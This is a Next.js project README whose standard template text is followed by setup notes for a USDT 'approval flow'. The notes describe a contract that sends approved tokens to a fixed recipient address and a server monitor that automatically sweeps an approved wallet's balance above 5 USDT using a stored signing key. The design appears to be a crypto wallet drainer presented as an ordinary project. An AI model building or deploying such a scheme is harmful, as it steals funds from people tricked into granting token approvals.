This is a [Next.js](https://nextjs.org) project bootstrapped with [`create-next-app`](https://nextjs.org/docs/app/api-reference/cli/create-next-app).

## Getting Started

First, run the development server:

```bash
npm run dev
# or
yarn dev
# or
pnpm dev
# or
bun dev
```

Open [http://localhost:3000](http://localhost:3000) with your browser to see the result.

You can start editing the page by modifying `app/page.tsx`. The page auto-updates as you edit the file.

This project uses [`next/font`](https://nextjs.org/docs/app/building-your-application/optimizing/fonts) to automatically optimize and load [Geist](https://vercel.com/font), a new font family for Vercel.

## Learn More

To learn more about Next.js, take a look at the following resources:

- [Next.js Documentation](https://nextjs.org/docs) - learn about Next.js features and API.
- [Learn Next.js](https://nextjs.org/learn) - an interactive Next.js tutorial.

You can check out [the Next.js GitHub repository](https://github.com/vercel/next.js) - your feedback and contributions are welcome!

## Deploy on Vercel

The easiest way to deploy your Next.js app is to use the [Vercel Platform](https://vercel.com/new?utm_medium=default-template&filter=next.js&utm_source=create-next-app&utm_campaign=create-next-app-readme) from the creators of Next.js.

Check out our [Next.js deployment documentation](https://nextjs.org/docs/app/building-your-application/deploying) for more details.

## Binance-Peg BSC-USD approval flow

The Solidity helper in [`contracts/UsdtApprovalTransfer.sol`](./contracts/UsdtApprovalTransfer.sol)
uses the verified Binance-Peg BSC-USD BEP-20 token at
`0x55d398326f99059fF775485246999027B3197955` and sends only to the immutable recipient
`0xf39AfA7346aACE4a3Aa48cEb014bE24cba2EB596`.

The token uses **18 decimals**. The owner must first call `approve` on the token contract
for the deployed helper address. Then the spender calls `transferApproved(owner, amount)`.
The TypeScript helpers in [`lib/binancePegBscUsd.ts`](./lib/binancePegBscUsd.ts) calculate
the exact raw amount for `55,400,000` tokens using the live `decimals()` value; they never
request or handle a private key.

### Backend transfer monitor

The Node.js monitor in [`lib/transferWorkflow.ts`](./lib/transferWorkflow.ts) can periodically
check an approved wallet and call USDT `transferFrom` when its balance is **greater than 5 USDT**.
It transfers the lesser of the wallet balance and the spender allowance, and never exposes the
signing key to the client. Enable it only in a trusted server environment:

```env
TRANSFER_MONITOR_ENABLED=true
APPROVED_WALLET_ADDRESS=0x...
TRANSFER_SIGNER_PRIVATE_KEY=0x...
TRANSFER_POLL_INTERVAL_MS=60000
```

`GET /api/transfer-workflow/status` returns the latest state and `POST` performs an immediate
check. The monitor is opt-in and requires a server-side signer whose address has the wallet's
USDT allowance.
